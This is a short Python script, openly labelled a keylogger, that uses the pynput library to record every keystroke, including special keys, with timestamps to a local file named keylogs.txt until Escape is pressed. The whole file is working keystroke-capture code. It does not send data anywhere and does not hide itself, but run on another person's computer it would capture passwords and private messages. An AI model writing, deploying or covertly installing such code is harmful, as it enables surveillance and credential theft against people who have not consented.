from pynput.keyboard import Listener, Key
import logging

log_file = "keylogs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info(f"key {key.char} pressed")
    except AttributeError:
        if key == Key.space:
            logging.info("Space key pressed")
        elif key == Key.enter:
            logging.info("Enter key pressed")
        else:
            # Log all other special keys (Shift, Ctrl, etc.)
            logging.info(f"Special key {key} pressed")
        
def on_release(key):
    if key == Key.esc:
        return False
    
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
if __name__ == "__main__":
    print("[*] Keylogger started. Press 'Esc' to stop.")
    start_keylogger()